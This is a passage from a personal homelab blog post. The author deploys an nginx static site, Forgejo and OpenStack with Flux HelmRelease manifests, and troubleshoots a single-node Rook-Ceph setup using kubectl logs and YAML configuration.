<span id="cb67-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 5m0s</span></span>
<span id="cb67-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">url</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> oci://docker.io/bitnamicharts</span></span></code></pre></div>
<p>So apparently, when using OCI helm charts, the organization acts as the “repo”, where you get helm charts from.</p>
<div class="sourceCode" id="cb68" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb68-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb68-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> helm.toolkit.fluxcd.io/v2</span></span>
<span id="cb68-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRelease</span></span>
<span id="cb68-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> nginx</span></span>
<span id="cb68-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb68-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> nginx</span></span>
<span id="cb68-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">reconcileStrategy</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ChartVersion</span></span>
<span id="cb68-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sourceRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb68-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> nginx</span></span>
<span id="cb68-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">version</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"18.2.4"</span></span>
<span id="cb68-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 1m0s</span></span>
<span id="cb68-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">values</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cloneStaticSiteFromGit</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">enabled</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">true</span></span>
<span id="cb68-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">repository</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://github.com/moonpiedumplings/moonpiedumplings.github.io</span></span>
<span id="cb68-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">branch</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> gh-pages</span></span>
<span id="cb68-22"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # 60 seconds is the default</span></span>
<span id="cb68-23"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">60</span></span>
<span id="cb68-24"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ingress</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-25"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">enabled</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">true</span></span>
<span id="cb68-26"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hostname</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> moonpiedumpl.ing</span></span>
<span id="cb68-27"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">annotations</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-28"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cert-manager.io/issuer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"letsencrypt-staging"</span></span>
<span id="cb68-29"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">acme.cert-manager.io/http01-edit-in-place</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"true"</span></span>
<span id="cb68-30"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tls</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb68-31"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hosts</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">moonpiedumpl.ing</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">]</span></span>
<span id="cb68-32"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">          </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">secretName</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> blog-acme</span></span></code></pre></div>
<p>And this works, although I’m unhappy that I can’t use a “latest” tag to automatically update to the latest version of the chart.</p>
<p>Also, the ingress created does not seem to have ssl set up properly. It has cert-manager’s local source, rather than the letsencrypt-staging for a source. But, the site is up on &lt;moonpiedumpl.ing&gt;. This is a lot simpler than some custom CI solution, and I suspect I can simply disable Github’s automatic static site generation from the branch, while still having quarto render my static site to the <code>gh-pages</code> branch.</p>
<p>This is probably because authentik and the bitnami helm nginx chart use differing values for their ingress configuration.</p>
</section>
<section id="forgejo" class="level2">
<h2 class="anchored" data-anchor-id="forgejo">Forgejo</h2>
<p>Forgejo has a helm chart</p>
<p><a href="https://artifacthub.io/packages/helm/forgejo-helm/forgejo">Artifacthub</a>. <a href="jttps://code.forgejo.org/forgejo-helm/forgejo-helm">Git repo</a>.</p>
<p>I don’t think I will be doing rootless, although that was my original plan.</p>
<p>Also, it looks like the forgejo helm chart has quite a bit of configuration options, including <code>gitea.oauth</code>, which I can probably use to configure</p>
</section>
<section id="openstack" class="level2">
<h2 class="anchored" data-anchor-id="openstack">Openstack</h2>
<p>I decided to use <a href="https://docs.openstack.org/openstack-helm/latest/readme.html">openstack-helm</a> for deployment, due to it’s declarative nature. Everything is helm charts, in a <a href="https://opendev.org/openstack/openstack-helm">git repo</a>.</p>
<ul>
<li>General parameters: <a href="https://docs.openstack.org/openstack-helm/latest/chart/index.html" class="uri">https://docs.openstack.org/openstack-helm/latest/chart/index.html</a></li>
</ul>
<p>There is a <a href="https://www.reddit.com/r/openstack/comments/1g1wt6u/looking_for_feedbacks_on_using_openstackhelm_with/">reddit post</a> about using Openstack helm with Gitops deployments, where I mention that searching github for <code>"kind: HelmRelease" path:*.y*ml "openstack"</code> gives me examples of openstack deployed using flux.</p>
<p><code>kubectl create namespace openstack</code></p>
<p>I decided to create a new namepsace for openstack, rather than putting everything in default. With authentik, I saw how it was somewhat difficult to delete all relevant persistent volumes, but deleting all resources of a type in a namespace is easy. Perhaps using the kubernetes “GUI” offered by the kubernetes vscode extension makes things easier.</p>
<p>Firstly: “By default OpenStack-Helm stateful sets expect to find a storage class named general.”</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>openebs-general.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb69" data-filename="openebs-general.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb69-1"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  ---</span></span>
<span id="cb69-2"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> storage.k8s.io/v1</span></span>
<span id="cb69-3"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> StorageClass</span></span>
<span id="cb69-4"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb69-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> general</span></span>
<span id="cb69-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openstack</span></span>
<span id="cb69-7"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">annotations</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb69-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">openebs.io/cas-type</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> local</span></span>
<span id="cb69-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">      cas.openebs.io/config</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">: </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">|</span></span>
<span id="cb69-10">        - name: StorageType</span>
<span id="cb69-11">          value: hostpath</span>
<span id="cb69-12">        - name: BasePath</span>
<span id="cb69-13">          value: /var/openstack/openebs/</span>
<span id="cb69-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">provisioner</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> openebs.io/local</span></span>
<span id="cb69-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">reclaimPolicy</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Retain</span></span>
<span id="cb69-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">volumeBindingMode</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> WaitForFirstConsumer</span></span></code></pre></div>
</div>
<p>I then followed the Node Labels, step, but the taint step failed:</p>
<pre><code>[moonpie@lizard flux-config]$ kubectl taint nodes -l 'node-role.kubernetes.io/control-plane' node-role.kubernetes.io/control-plane-
error: taint "node-role.kubernetes.io/control-plane" not found</code></pre>
<p>I’ll just skip it for now.</p>
<p>It took some fiddling, since I am converting the imperative steps but I figured out what to do.</p>
<pre><code>helm upgrade --install rabbitmq openstack-helm-infra/rabbitmq \
    --namespace=openstack \
    --set pod.replicas.server=1 \
    --timeout=600s \
    $(helm osh get-values-overrides -p ${OVERRIDES_DIR} -c rabbitmq ${FEATURES})

helm osh wait-for-pods openstack</code></pre>
<p>So at this step, rather than running the helm commands, I instead have to go to the <a href="https://opendev.org/openstack/openstack-helm-infra/src/branch/master/rabbitmq/values_overrides/2024.2-ubuntu_jammy.yaml">relevant file</a> in the overrides directory, and manually add those values to my helmrelease. I also investigated something automatically, like getting values from a url, but it looks more complicated than simply copying values over.</p>
<section id="neutron" class="level3">
<h3 class="anchored" data-anchor-id="neutron">Neutron</h3>
<p>Most of openstack will be left alone done sequentially, but neutron will get it’s own section.</p>
<p><a href="https://docs.openstack.org/openstack-helm/latest/devref/networking.html">Openstack-helm Neutron Networking docs</a>. But this doesn’t list how I can set the interface that openstack uses for the networking.</p>
<p>I also found a very good <a href="https://github.com/beskar-cloud/beskar-flux/blob/master/apps/g2-oidc/03-openstack/03-openstack.base/06-keystone.yaml">example on github</a> which uses flux and openstack-helm to dpeloy openstack hooked up to OIDC.</p>
<p>Anyway, the big reason I am worried about neutron’s setup, is becaues I have a unique bridging setup. Openstack neutron requires it’s own bridge for external networking, but I only have a single physical interface. In a previous version of my openstack deployment, with kolla-ansible, I split the single network interface with the</p>
<p>However, it looks like openstack-helm <a href="https://github.com/openstack/openstack-helm/blob/7f82ce2556e283a47f8cc6f6cc3f3d0c9524e22a/doc/source/devref/networking.rst#L292">has an option to automatically add a bridge</a>.</p>
<p>However, it seems like I don’t want this setting, becasue it actually <a href="https://github.com/openstack/openstack-helm/blob/7f82ce2556e283a47f8cc6f6cc3f3d0c9524e22a/neutron/templates/bin/_neutron-bagpipe-bgp-init.sh.tpl#L24">adds a bridge using the ip command</a>. I already have a bridge setup, so I don’t want this.</p>
<p>I need to copy the kolla-ansible settings of <a href="https://github.com/openstack/kolla-ansible/blob/4e2af1872da2466843de1fa3ea639f2b79828663/ansible/roles/neutron/templates/linuxbridge_agent.ini.j2#L9">mapping neutron_external_interface</a> to an <code>physical_interface_mappings</code>, in the helm chart values.</p>
<p>Okay, it looks like <a href="https://opendev.org/openstack/openstack-helm/src/branch/master/neutron/values.yaml#L2095">openstack helm has an option to set <code>physical_interface_mappings</code></a>.</p>
<p>Given that I already have a bridge, I wonder if I can simply use that existing bridge as a linuxbridge? Or should I use [the veth trick again])https://moonpiedumplings.github.io/projects/build-server-2/#bridge-veth)</p>
<p>I’m going to do that again, since I know it works and I already have a bridge.</p>
<p><code>nmcli con add type veth ifname veth1 con-name veth1 veth.peer eth1</code> and add <code>veth1</code> to cockpit.</p>
<p>And then use <code>eth1</code> as my networking interface. This appears to work, as I can see my networking setup in horizon.</p>
</section>
<section id="cinder" class="level3">
<h3 class="anchored" data-anchor-id="cinder">Cinder</h3>
<p>I am also worried about openstack-helm cinder, because it seems I cannot deploy it using local storage, I must use ceph. I’m worried about the performance implications of this, but a <a href="https://www.reddit.com/r/ceph/comments/1baofpb/how_bad_is_cephs_performance_on_a_single_node/ku3z0s0/">reddit comment</a> says that the issue with single node ceph is not performance, but overhead, so I should be good.</p>
<p>I’m now getting an error:</p>
<div class="sourceCode" id="cb72" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb72-1">[moonpie@lizard flux-config]$ kubectl get events -n openstack</span>
<span id="cb72-2">LAST SEEN   TYPE      REASON             OBJECT                                    MESSAGE</span>
<span id="cb72-3">96s         Warning   FailedMount        pod/cinder-backup-7599fff8fb-8z22f        MountVolume.SetUp failed for volume "ceph-etc" : configmap "ceph-etc" not found</span>
<span id="cb72-4">5m40s       Warning   FailedMount        pod/cinder-backup-7599fff8fb-8z22f        MountVolume.SetUp failed for volume "ceph-keyring" : secret "cinder-volume-rbd-keyring" not found</span>
<span id="cb72-5">2m56s       Warning   FailedMount        pod/cinder-storage-init-j4c78             MountVolume.SetUp failed for volume "ceph-etc" : configmap "ceph-etc" not found</span>
<span id="cb72-6">96s         Warning   FailedMount        pod/cinder-volume-877748d7d-mvnk4         MountVolume.SetUp failed for volume "ceph-etc" : configmap "ceph-etc" not found</span>
<span id="cb72-7">29m         Normal    JobAlreadyActive   cronjob/cinder-volume-usage-audit         Not starting job because prior execution is running and concurrency policy is Forbid</span>
<span id="cb72-8">100s        Warning   FailedMount        pod/libvirt-libvirt-default-nznv7         MountVolume.SetUp failed for volume "ceph-etc" : configmap "ceph-etc" not found</span>
<span id="cb72-9">5m44s       Warning   FailedMount        pod/libvirt-libvirt-default-nznv7         MountVolume.SetUp failed for volume "ceph-keyring" : secret "pvc-ceph-client-key" not found</span></code></pre></div>
<p>Looking at the secrets and the configmaps, there doesn’t appear to the <code>ceph-etc</code> or <code>ceph-keyring</code> secrets. They are not automatically created?</p>
<p>Oops, I forgot the <a href="https://docs.openstack.org/openstack-helm/latest/install/prerequisites.html">prerequisites</a>. You are supposed to install ceph <em>before</em> doing all of this.</p>
<p>Even after fixing this, I still need more work, to fix some things up. Apparantly, in the <a href="https://opendev.org/openstack/openstack-helm-infra/src/branch/master/tools/deployment/ceph/ceph-rook.sh">example deploy</a>, there are some setups that I don’t have. For example, it initally crashes due to the ceph toolbox not being created.</p>
<p>And when I attempt to add those variables to enable the toolbox, it still crashes because <a href="https://github.com/rook/rook/issues/2329">no serviceaccount is created</a>. It seems I should explicitly use a value, rather than allowing for the default.</p>
<p>The example deploy is mentioned in <a href="https://lists.openstack.org/archives/list/openstack-discuss@lists.openstack.org/thread/QC6LIDCZK4AIQRLIBQVY3AR7PYE7VMAZ/#BTY3N2WTNILHZU2JDFO4UDWGHF3PHDOP">a discussion on the openstack mailing lists</a></p>
<p>Ceph doesn’t seem to be starting properly though:</p>
<div class="sourceCode" id="cb73" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb73-1">[moonpie@lizard moonpiedumplings.github.io]$ kubectl get events -n ceph</span>
<span id="cb73-2">LAST SEEN   TYPE      REASON               OBJECT                                 MESSAGE</span>
<span id="cb73-3">4m41s       Warning   FailedMount          pod/rook-ceph-tools-86bc48dfdb-jdsp6   MountVolume.SetUp failed for volume "mon-endpoint-volume" : configmap "rook-ceph-mon-endpoints" not found</span>
<span id="cb73-4">14m         Warning   FailedMount          pod/rook-ceph-tools-86bcb68487-kzwkd   MountVolume.SetUp failed for volume "mon-endpoint-volume" : configmap "rook-ceph-mon-endpoints" not found</span>
<span id="cb73-5">4m41s       Warning   FailedMount          pod/rook-ceph-tools-86bcb68487-kzwkd   MountVolume.SetUp failed for volume "ceph-admin-secret" : secret "rook-ceph-mon" not found</span></code></pre></div>
<p>I’m going to attempt to nuke all resources in the <code>openstack</code> and <code>ceph</code> namespaces.</p>
<p><code>kubectl delete -n openstack all --all</code> and then another for ceph.</p>
<div class="sourceCode" id="cb74" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb74-1">NAMESPACE   NAME   DATADIRHOSTPATH   MONCOUNT   AGE     PHASE         MESSAGE                                                                                                                     HEALTH   EXTERNAL   FSID</span>
<span id="cb74-2">rook-ceph   ceph   /var/lib/rook     3          3d17h   Progressing   failed to perform validation before cluster creation: cannot start 3 mons on 1 node(s) when allowMultiplePerNode is false</span></code></pre></div>
<p>Oh. Ceph wants 3 nodes by default, but I only give it one.</p>
<div class="sourceCode" id="cb75" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb75-1">---</span>
<span id="cb75-2">apiVersion: helm.toolkit.fluxcd.io/v2</span>
<span id="cb75-3">kind: HelmRelease</span>
<span id="cb75-4">metadata:</span>
<span id="cb75-5">  name: rook-ceph-cluster</span>
<span id="cb75-6">  namespace: rook-ceph</span>
<span id="cb75-7">spec:</span>
<span id="cb75-8">  chart:</span>
<span id="cb75-9">    spec:</span>
<span id="cb75-10">      chart: rook-ceph-cluster</span>
<span id="cb75-11">      reconcileStrategy: ChartVersion</span>
<span id="cb75-12">      version: "v1.16.2"</span>
<span id="cb75-13">      sourceRef:</span>
<span id="cb75-14">        kind: HelmRepository</span>
<span id="cb75-15">        name: rook</span>
<span id="cb75-16">  interval: 1m0s</span>
<span id="cb75-17">  values:</span>
<span id="cb75-18">    operatorNamespace: rook-ceph</span>
<span id="cb75-19">    toolbox:</span>
<span id="cb75-20">      enabled: true</span>
<span id="cb75-21">    clusterName: ceph</span>
<span id="cb75-22">    cephClusterSpec:</span>
<span id="cb75-23">      Mgr:</span>
<span id="cb75-24">        Count: 1</span>
<span id="cb75-25">      Mon:</span>
<span id="cb75-26">        Count: 1</span></code></pre></div>
<p>With this, the reconcile succeeds. But it still fails to set up, and it appears that the ceph cluster does not get deleted. Even when I attempt to use <code>kubectl delete</code> to delete the resource, it just hangs indefinitely.</p>
<div class="sourceCode" id="cb76" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb76-1">[moonpie@cachyos-x8664 ~]$ kubectl delete --force -n rook-ceph cephclusters.ceph.rook.io ceph</span>
<span id="cb76-2">Warning: Immediate deletion does not wait for confirmation that the running resource has been terminated. The resource may continue to run on the cluster indefinitely.</span>
<span id="cb76-3">cephcluster.ceph.rook.io "ceph" force deleted</span></code></pre></div>
<p>It appears that lots of stuff is created, but isn’t properly deleted.</p>
<p><code>kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get --show-kind --ignore-not-found -n rook-ceph</code> lists <em>all</em> resources, rather than just one that kubectl usually shows.</p>
<p><a href="https://rook.io/docs/rook/latest/Storage-Configuration/ceph-teardown/">Rook-Ceph cleanup/deletion steps.</a></p>
<div class="sourceCode" id="cb77" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb77-1">kubectl describe -n rook-ceph cephclusters.ceph.rook.io ceph</span>
<span id="cb77-2"></span>
<span id="cb77-3"></span>
<span id="cb77-4">92s (x4075 over 11h)       Warning   ReconcileFailed      CephCluster/ceph                         failed to reconcile CephCluster "rook-ceph/ceph". CephCluster "rook-ceph/ceph" will not be deleted until all dependents are removed: CephFilesystem: [ceph-filesystem], CephFilesystemSubVolumeGroup: [ceph-filesystem-csi], CephObjectStore: [ceph-objectstore]</span></code></pre></div>
<p>Also, to delete the cluster properly, it has to have the dependents deleted.</p>
<p>After fixing this, I get another error:</p>
<pre><code> ----     ------           ----  ----                          -------
  Warning  ReconcileFailed  76s   rook-ceph-cluster-controller  failed to reconcile CephCluster "rook-ceph/ceph". failed to reconcile cluster "ceph": failed to configure local ceph cluster: failed the ceph version check: failed to complete ceph version job: failed to run CmdReporter rook-ceph-detect-version successfully. failed waiting for results ConfigMap rook-ceph-detect-version. timed out waiting for results ConfigMap</code></pre>
<p>So it looks like the rook ceph is not starting, meaning no mons/endpoints are started, leading to cascading failures in the rest of the system. I think the problem is that I don’t have a persistent volume that can offer block storage devices available, nor have I configured the ceph cluster to do this.</p>
<p><a href="https://rook.io/docs/rook/v1.16/CRDs/Cluster/pvc-cluster/">Ceph with K8s PVs</a>. <a href="https://openebs.io/docs/user-guides/local-storage-user-guide/local-pv-lvm/advanced-operations/lvm-raw-block-volume">And thankfully, openebs has docs on provisioning a raw block storageclass</a>.</p>
<p>No, it doesn’t seem to be that. Perhaps my issue is that I am attempting to create a ceph “cluster” on a single node. I found a <a href="https://www.rusinov.ie/en/posts/2020/setting-up-single-node-ceph-cluster-for-kubernetes/">relevant blogpost</a> (<a href="https://web.archive.org/web/20230201154957/https://www.rusinov.ie/en/posts/2020/setting-up-single-node-ceph-cluster-for-kubernetes/">archive</a>) about this.</p>
